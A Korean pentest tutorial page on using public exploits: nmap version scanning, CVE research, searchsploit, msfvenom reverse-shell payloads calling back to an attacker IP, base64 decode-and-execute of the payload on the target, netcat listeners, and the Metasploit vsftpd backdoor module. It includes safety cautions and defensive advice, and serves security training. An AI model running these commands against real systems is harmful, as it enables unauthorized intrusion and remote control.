---
sidebar_position: 3
title: Public Exploits
---

# 공개 익스플로잇

## 개요

**공개 익스플로잇**: 알려진 취약점에 대한 개념증명(PoC) 코드

**특징**:
- 취약점 발견 → 보고 → 패치 후 공개
- 오래된 시스템일수록 공개 취약점 존재 가능성 높음
- GitHub, Exploit-DB 등에서 공개

**주의사항**:
- 대상 시스템 가용성에 영향 금지
- 공격 전후 상태 동일하게 유지
- 모든 변경사항 제거 및 문서화

---

## 익스플로잇 활용 프로세스

1. 대상 시스템 정보 수집
2. 취약점 정보 수집
3. 공개 익스플로잇 검색
4. 공개 익스플로잇 분석
5. 페이로드 준비
6. 익스플로잇 수정 및 실행

---

## 1. 대상 시스템 정보 수집

### 수집 항목

- 시스템 이름 및 역할
- 버전 정보
- 출시 연도
- 알려진 취약점 목록

### 버전 정보 확인

```bash
# Nmap 서비스 스캔
nmap -sV -p [PORT] [TARGET]

# 예시
nmap -sV -p 21,22,80 192.168.1.10

# 배너 그래빙
nc [TARGET] [PORT]

# 예시
nc 192.168.1.10 21
```

### 출시 연도 확인

Google 검색 예시:
- "vsftpd 2.3.4 release date"
- "Apache 2.4.49 release date"

---

## 2. 취약점 정보 수집

### CVE 데이터베이스

**주요 데이터베이스**:
- https://www.cve.org/
- https://cve.mitre.org/
- https://nvd.nist.gov/
- https://www.cvedetails.com/

### CVE 검색

Google 검색 예시:
- "vsftpd 2.3.4 vulnerabilities"
- "Apache 2.4.49 CVE"

### CVE 정보 분석

**확인 사항**:
- 취약점 설명 (Description)
- 영향 범위 (CVSS Score)
- 공격 조건 (Attack Vector)
  - Remote/Local
  - Authenticated/Unauthenticated
- 패치 정보 (Patch Available)

**CVSS Score 해석**:
- 9.0-10.0: Critical (치명적)
- 7.0-8.9: High (높음)
- 4.0-6.9: Medium (중간)
- 0.1-3.9: Low (낮음)

---

## 3. 공개 익스플로잇 검색

### Searchsploit (Kali Linux)

```bash
# 기본 검색
searchsploit [SERVICE] [VERSION]

# 예시
searchsploit vsftpd 2.3.4
searchsploit apache 2.4.49

# 대소문자 무시
searchsploit -i apache

# 상세 정보 보기
searchsploit -x [NUMBER]
searchsploit -x 49908

# 익스플로잇 복사
searchsploit -m [NUMBER]

# JSON 출력
searchsploit apache -j | jq

# 업데이트
searchsploit -u
```

### Google 검색

GitHub 검색 예시:
- "CVE-2021-41773 exploit site:github.com"
- "CVE-2021-41773 poc site:github.com"

Exploit-DB 검색 예시:
- "CVE-2021-41773 exploit site:exploit-db.com"

---

## 4. 익스플로잇 분석

### 익스플로잇 종류

| 종류 | 설명 | 사용 여부 |
|------|------|-----------|
| Remote Code Execution (RCE) | 원격 코드 실행 | 적극 사용 |
| Privilege Escalation | 권한 상승 | 사용 |
| Authentication Bypass | 인증 우회 | 사용 |
| Information Disclosure | 정보 유출 | 사용 |
| Buffer Overflow | 버퍼 오버플로우 | 주의 (BSOD 가능) |
| Denial of Service (DoS) | 서비스 거부 | 사용 금지 |

### 코드 분석 순서

**1단계: 주석과 설명 읽기**

```python
# Exploit Title: Apache 2.4.49 Path Traversal
# Date: 2021-10-05
# Exploit Author: exploit-db
# CVE: CVE-2021-41773
```

**2단계: 큰 그림 보기**
- 메인 함수
- 익스플로잇 트리거 함수
- 페이로드 위치

**3단계: 중요 로직 확인**
- 취약점 트리거 방법
- 페이로드 전송 방식
- 응답 처리 방법

---

## 5. 페이로드 준비

### Msfvenom으로 페이로드 생성

```bash
# Linux 리버스 쉘
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=[ATTACKER_IP] LPORT=[PORT] -f elf -o shell.elf

# Windows 리버스 쉘
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=[ATTACKER_IP] LPORT=[PORT] -f exe -o shell.exe

# 예시
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=10.8.0.2 LPORT=4444 -f elf -o shell.elf
```

### Base64 인코딩

```bash
# 바이너리를 Base64로 변환
cat shell.elf | base64 -w 0 > shell.b64

# 대상 시스템에서 디코딩 및 실행
echo 'BASE64_STRING' | base64 -d > /tmp/shell.elf
chmod +x /tmp/shell.elf
/tmp/shell.elf
```

---

## 6. 익스플로잇 실행

### Python 익스플로잇 실행

```bash
# 리스너 시작 (터미널 1)
nc -lvnp [PORT]

# 익스플로잇 실행 (터미널 2)
python3 exploit.py [TARGET_IP]

# 전체 예시
# 터미널 1
nc -lvnp 4444

# 터미널 2
python3 exploit.py 192.168.1.10
```

### Metasploit 모듈 사용

```bash
msfconsole

# 익스플로잇 검색
search vsftpd

# 모듈 선택
use exploit/unix/ftp/vsftpd_234_backdoor

# 옵션 확인
show options

# 설정
set RHOST 192.168.1.10
set LHOST 10.8.0.2

# 실행
exploit
```

---

## 실전 워크플로우

### 단계별 체크리스트

**1. 대상 시스템 정보 수집 완료**
- 서비스 이름, 버전, 출시 연도

**2. CVE 번호 및 취약점 상세 확인**
- CVSS Score, 공격 조건, 영향 범위

**3. 익스플로잇 코드 검증**
- 신뢰할 수 있는 출처, Star 수, 최근 업데이트

**4. 익스플로잇 코드 분석 완료**
- 주석 읽기, 큰 그림 파악, 중요 로직 확인

**5. DoS/시스템 영향 확인**
- Buffer Overflow, DoS 여부 확인

**6. 페이로드 준비 및 테스트**
- 로컬 환경에서 테스트

**7. 백업/롤백 계획 수립**
- 원복 절차 준비

**8. 익스플로잇 실행 및 문서화**
- 모든 행위 기록

---

## 주요 명령어 요약

```bash
# Searchsploit
searchsploit [SERVICE] [VERSION]
searchsploit -x [NUMBER]
searchsploit -m [NUMBER]

# 페이로드 생성
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=[IP] LPORT=[PORT] -f elf -o shell.elf

# 리스너
nc -lvnp [PORT]

# Metasploit
msfconsole
search [SERVICE]
use [MODULE]
set RHOST [TARGET]
set LHOST [YOUR_IP]
exploit
```

## 문제 해결

### 익스플로잇이 작동하지 않는 경우

```bash
# 1. 버전 재확인
nmap -sV -p [PORT] [TARGET]

# 2. 디버깅 모드 실행
python3 -u exploit.py [TARGET]

# 3. 방화벽 확인
nc -zv [TARGET] [PORT]

# 4. 로그 확인
tail -f /var/log/apache2/error.log
```

### Python 모듈 없음

```bash
# 필요한 모듈 설치
pip3 install requests
pip3 install beautifulsoup4
pip3 install pwntools
```

## 실무 팁

1. **테스트 환경 우선** - 가능하면 로컬에서 먼저 테스트
2. **코드 분석 필수** - 악의적인 코드 여부 확인
3. **백업 필수** - 원복 가능하도록 준비
4. **문서화 철저** - 모든 행위 기록
5. **DoS 주의** - Buffer Overflow 익스플로잇 신중히 사용
6. **타이밍** - 업무 시간 외 실행 권장

## 보안 권장사항

1. 정기적인 패치 관리
2. 취약점 스캐닝
3. 최신 버전 유지
4. 불필요한 서비스 비활성화
5. 방화벽 설정
6. 침입 탐지 시스템 (IDS) 운영
